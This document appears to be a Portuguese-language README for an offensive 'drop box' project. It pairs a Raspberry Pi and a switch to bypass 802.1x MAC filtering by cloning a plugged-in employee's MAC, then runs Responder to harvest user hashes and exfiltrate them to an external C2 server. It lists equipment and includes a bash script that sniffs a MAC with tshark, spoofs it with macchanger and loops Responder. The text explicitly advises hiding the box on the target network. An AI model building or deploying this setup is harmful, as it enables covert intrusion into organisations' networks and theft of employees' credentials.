# Projeto

O Objetivo desse projeto visa realizar de forma "automatizada" e "stealth" o bypass da camada de proteção 802.1x PNAC (Filtro de MAC) e iniciar quaisquer scripts/exploits/ferramentas ao ingressar dentro da rede alvo utilizando ferramentas como RaspberryPI3 e um Switch, ambos de fácil acesso para compra.

No cenário proposto, um atacante utilizará a ferramenta + scripts contruidos para realizar o ataque, ao obter acesso local aos cabos de rede referente a rede alvo, basta plugar um computador de um colaborador para clonar seu MAC, e depois o mesmo ingresará na rede, assim rodando as automações, em sequência é recomendável que a caixa seja escondida equanto conectada ao cabo de rede, para que permaneça na rede realizando os ataques.

Para o caso atual, a ferramenta a ser ativada sera o "Responder", o qual terá função de coletar Hashes de usuários na rede e exfiltra-los para um servidor externo (C2).

# Equipamentos

* Raspberry PI (recomendável PI3 1GB RAM)
* 1 Cabo microUSB/USB-C (Depende do RaspberryPI)
* Tela Touch RaspberryPI (Recomendável/Não Obrigatório)
* Switch de rede
* Conversor de energia do Switch para USB
* 2 Cabos de Rede RJ45 (Pequenos)
* 1 PowerBank (Pequeno)
* Teclado Bluethooth (Recomendável/Não Obrigatório)
* Conversor LAN - USB
* Fita Dupla-Face + Caixa (20cm x 15cm +-)

# Etapas:

## Setup Raspberry
- [ ] kali ISO
- [ ] kali LCD Screen
- [ ] Responder as a Service: https://github.com/eep0x10/runAs.service/tree/main
- [ ] Scripts:


start_resp.sh
```
# Reset MAC Address Random
#sudo ifconfig eth1 hw ether $(ethtool -P eth1 | awk '{print $3}') 1>&-

while true;do
echo "[+] Capturando MAC Address, aguarde 10 segundos..."

echo "" > /tmp/captured_mac.txt

sudo tshark -i eth1 -Y "_ws.col.protocol matches \"IGMPv3\"" -T fields -e eth.src -a duration:10 2>&- | sort -u > /tmp/captured_mac.txt
echo "64:1c:67:e6:d8:a0" > /tmp/captured_mac.txt
# Caminho do arquivo de onde ler o valor
arquivo="/tmp/captured_mac.txt"
valor=$(cat "$arquivo" | tr -d '[:space:]')
# Executa o comando macchanger com o valor lido do arquivo
sudo macchanger -m "$valor" eth1 2>&- # Substitua "eth1" pela interface de rede desejada

cd /usr/share/responder
sudo python3 automation.py
done
```


resp-onder.sh
cd /usr/share/responder
sudo python3 /usr/share/responder/automation.py

